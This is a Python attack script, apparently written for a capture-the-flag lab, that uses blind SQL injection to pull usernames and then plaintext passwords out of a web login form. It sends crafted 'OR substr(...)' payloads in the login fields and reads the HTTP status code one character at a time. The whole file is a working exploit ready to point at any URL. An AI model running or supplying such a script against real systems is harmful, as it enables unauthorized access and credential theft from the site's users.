import requests
from colorama import Fore, Style
import sys
animated_chars = ["|", "/", "-", "\\"]
if len(sys.argv) != 2:
    print("Please provide a url")
    print("usage: python3 blind.py http://10.129.233.0")
    exit()
url = sys.argv[1]

def user_enum():
    
    chars = "0123456789abcdefghijklmnopqrstuvwxyz!\"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~"
    username=""
    i = len(username)+1
    users = []
    count = 0
    while True:
        for p,c in enumerate(chars):
            Found=False
            q = f"' OR substr(username,1,{i}) = '{username+c}'-- -"
            r = requests.post(url=url,data={"Username":q,"Password":"test"},allow_redirects=False)
            animated_char = animated_chars[p % len(animated_chars)]
            print(f"\r{Fore.CYAN}{animated_char}{Style.RESET_ALL}{Fore.YELLOW} Trying {c}{Style.RESET_ALL}", end="")
            if r.status_code != 200:
                users.append(c)
                print(f"\n{Fore.GREEN}[+] Char is found:{Style.RESET_ALL} {c} ,{Fore.BLUE} username: {Style.RESET_ALL}{users[count]}")
                count+=1
        if not Found :
            print(f"\nusernames = {Fore.GREEN}{users}{Style.RESET_ALL}")
            break
        i+=1

    names = []
    for user in users:
        i=2
        name=user
        print(f"Finding Full name of the user {name}")
        while True:
            for p,c in enumerate(chars):
                Found=False
                q = f"' OR substr(username,1,{i}) = '{name+c}'-- -"
                r = requests.post(url=url,data={"Username":q,"Password":"test"},allow_redirects=False)
                animated_char = animated_chars[p % len(animated_chars)]

                print(f"\r{Fore.CYAN}{animated_char}{Style.RESET_ALL} {Fore.YELLOW}{name+c}{Style.RESET_ALL}", end="")
                if r.status_code != 200:
                    Found=True
                    name +=c
                    print(f"\n{Fore.GREEN}[+] Char is found:{Style.RESET_ALL} {c} ,{Fore.BLUE} username: {Style.RESET_ALL}{name}")
                    count+=1
                    break
            if not Found :
                names.append(name)
                print(f"\nusername = {Fore.GREEN}{name}{Style.RESET_ALL}")
                break
            i+=1
    return names

def pass_enum(names):
    global url
    chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~"
    for user in names:
        print(f"Finding password for user {Fore.BLUE}{user}{Style.RESET_ALL}")
        PASSWORD=""
        i = len(PASSWORD)+1
        while True:
            for p,c in enumerate(chars):
                Found=False
                pass_inj = f"' OR substr(password,1,{i}) = '{PASSWORD+c}' && username = '{user}' -- -"
                r = requests.post(url=url,data={"Username":'admin',"Password":pass_inj},allow_redirects=False)
                animated_char = animated_chars[p % len(animated_chars)]
                print(f"\r{Fore.CYAN}{animated_char}{Style.RESET_ALL} {Fore.YELLOW}{PASSWORD+c}{Style.RESET_ALL}", end="")
                if r.status_code != 200:
                    PASSWORD+=c
                    Found=True
                    print(f"\n{Fore.GREEN}[+] Char is found:{Style.RESET_ALL} {c} ,{Fore.BLUE} Password: {Style.RESET_ALL}{PASSWORD}")
                    break
            if not Found :
                print(f"\nPASSWORD = {Fore.GREEN}{PASSWORD}{Style.RESET_ALL} for user {Fore.GREEN}{user}{Style.RESET_ALL}")
                break
            i+=1


if __name__ == '__main__':
    users = user_enum()
    pass_enum(users)